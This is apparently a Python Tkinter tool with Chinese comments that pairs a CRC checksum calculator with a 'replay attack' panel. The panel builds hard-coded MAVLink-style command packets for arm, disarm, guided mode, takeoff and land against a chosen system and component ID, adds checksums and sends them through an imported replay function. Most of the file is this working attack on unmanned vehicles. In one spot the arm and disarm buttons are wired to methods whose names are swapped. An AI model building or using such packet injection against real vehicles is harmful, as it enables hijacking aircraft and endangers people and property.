# author : erchen
# time : 2022/12/13 19:44

from tkinter import *
from CRC import crc_check
from replay import replay_attack


# 根窗口
class BaseDesk:
    def __init__(self, master):
        self.root = master
        # 窗口名称
        self.root.title('工具包')
        # 窗口大小
        self.root.geometry('1000x600')
        # 打开初始界面
        FaceInit(self.root)


# 初始界面
class FaceInit:
    def __init__(self, master):
        # master 根窗口
        self.master = master
        # initface 当前界面
        self.initface = Frame(self.master)
        self.initface.pack()
        # 重放攻击按钮
        btn_replay_attack = Button(self.initface, text='重放攻击', command=self.replay_attack)
        btn_replay_attack.pack()
        # CRC校验按钮
        btn_crc_check = Button(self.initface, text='CRC校验', command=self.crc_check)
        btn_crc_check.pack()

    # 打开CRC校验界面
    def crc_check(self):
        self.initface.destroy()
        FaceCRC(self.master)

    # 打开重放攻击界面
    def replay_attack(self):
        self.initface.destroy()
        FaceReplay(self.master)


# CRC校验界面
class FaceCRC:
    def __init__(self, master):
        # master 根窗口
        self.master = master
        # initface 当前界面
        self.initface = Frame(self.master)
        self.initface.pack()
        # 返回按钮
        btn_back = Button(self.initface, text='返回', command=self.back)
        btn_back.pack()
        # 输入数据包
        self.L1 = Label(self.initface, text="数据包")
        self.L1.pack()
        self.E1 = Entry(self.initface, 	width=50)
        self.E1.pack()
        # 计算校验值按钮
        btn_cal = Button(self.initface, text='计算校验值', command=self.calculation)
        btn_cal.pack()
        # 计算结果呈现的文本框
        self.txt = Text(self.initface)
        self.txt.pack()

    # 返回初始界面
    def back(self):
        self.initface.destroy()
        FaceInit(self.master)

    # 导入CRC.py，计算校验码并打印
    def calculation(self):
        try:
            s = crc_check(self.E1.get())
            s = '数据' + self.E1.get() + '的校验值为：' + s + '\n'
            self.E1.delete(0, END)
            self.txt.insert(END, s)
        except:
            self.E1.delete(0, END)
            s = '输入不合法！\n'
            self.txt.insert(END, s)


# 重放攻击界面
class FaceReplay:
    def __init__(self, master):
        # master 根窗口
        self.master = master
        # initface 当前界面
        self.initface = Frame(self.master)
        self.initface.pack()
        # 返回按钮
        btn_back = Button(self.initface, text='返回', command=self.back)
        btn_back.pack()
        # 输入系统ID
        self.L1 = Label(self.initface, text="系统ID")
        self.L1.pack()
        self.E1 = Entry(self.initface, width=50)
        self.E1.pack()
        # 输入组件ID
        self.L2 = Label(self.initface, text="组件ID")
        self.L2.pack()
        self.E2 = Entry(self.initface, width=50)
        self.E2.pack()
        # 攻击类型放入同一个框架，方便布局
        messagetype = Frame(self.initface)
        messagetype.pack()
        # 显示文本， "重放数据类型"
        messagelabel = Label(messagetype, text="重放数据类型")
        messagelabel.pack(side='left')
        btn_start = Button(messagetype, text='解锁', command=self.lock)
        btn_start.pack(side='left')
        btn_start = Button(messagetype, text='锁定', command=self.unlock)
        btn_start.pack(side='left')
        btn_start = Button(messagetype, text='Guided模式', command=self.guided)
        btn_start.pack(side='left')
        btn_start = Button(messagetype, text='起飞', command=self.takeoff)
        btn_start.pack(side='left')
        btn_start = Button(messagetype, text='降落', command=self.land)
        btn_start.pack(side='left')
        # 展示运行结果
        self.txt = Text(self.initface)
        self.txt.pack()


    def back(self):
        self.initface.destroy()
        FaceInit(self.master)


    def general(self):
        id_system = self.E1.get()
        id_component = self.E2.get()
        return id_system+id_component

    def lock(self):
        id_mav = self.general()
        # 根据系统ID和组件ID，组合数据包并计算校验码
        data = 'fe216a' + id_mav + '4c0000803f0000000000000000000000000000000000000000000000009001010100'
        data += crc_check(data)
        replay_attack(data)

    def unlock(self):
        id_mav = self.general()
        data = 'fe2140' + id_mav + '4c000000000000000000000000000000000000000000000000000000009001010100'
        data += crc_check(data)
        replay_attack(data)

    def guided(self):
        id_mav = self.general()
        data1 = 'fe2116' + id_mav + '4c0000803f000080400000000000000000000000000000000000000000b000010100'
        data1 += crc_check(data1)
        data2 = 'fe06c8' + id_mav + '0b040000000101'
        data2 += crc_check(data2)
        replay_attack(data1)
        replay_attack(data2)

    def takeoff(self):
        id_mav = self.general()
        data = 'fe2116' + id_mav + '4c000000000000000000000000000000000000000000000000000048421600010100'
        data += crc_check(data)
        replay_attack(data)

    def land(self):
        id_mav = self.general()
        data1 = 'fe217f' + id_mav + '4c0000803f000010410000000000000000000000000000000000000000b000010100'
        data1 += crc_check(data1)
        data2 = 'fe0680' + id_mav + '0b090000000101'
        data2 += crc_check(data2)
        replay_attack(data1)
        replay_attack(data2)


if __name__ == '__main__':
    root = Tk()
    BaseDesk(root)
    root.mainloop()
